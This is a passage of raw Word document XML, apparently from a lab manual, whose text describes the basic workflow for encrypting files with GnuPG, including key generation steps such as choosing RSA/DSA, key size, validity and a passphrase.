        <w:spacing w:before="29"/>
        <w:ind w:left="100" w:right="7897"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>B</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-14"/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>orkf</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ow:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="66" w:firstLine="710"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>In order</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o encrypt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>sender shou</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>d have a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>va</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">open key of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">person </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">o whom </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>go</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>be</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>sen</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>open</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>key</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>used</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>by</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>sender</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>encry</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>da</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>cannot</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">be </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:t>sed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o decrypt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>rece</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:t>er can</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>decrypt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e us</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>va</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e secret</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>key and a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>pa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>sphrase.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="8459"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>gor</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>thm:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="7926"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>1.  I</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>G</w:t>
      </w:r>
      <w:r>
        <w:t>nuPG</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="5835"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>2.  Genera</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>pub</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>key and pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e key</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">a. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Se</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ect</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>go</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>hm</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">for keys </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o be gene</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed(RSA</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>DSA)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="810" w:right="4824"/>
      </w:pPr>
      <w:r>
        <w:t>b.  Set</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he keys</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ze</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>be</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ween</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">1024 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">o 4096. c. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Set</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>va</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">y of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">e key </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s of days. d.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er your na</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e, e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>mm</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">e. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">secure passphrase </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o gener</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he keys f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>na</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-16"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="6361"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>3.  Cr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a revoc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
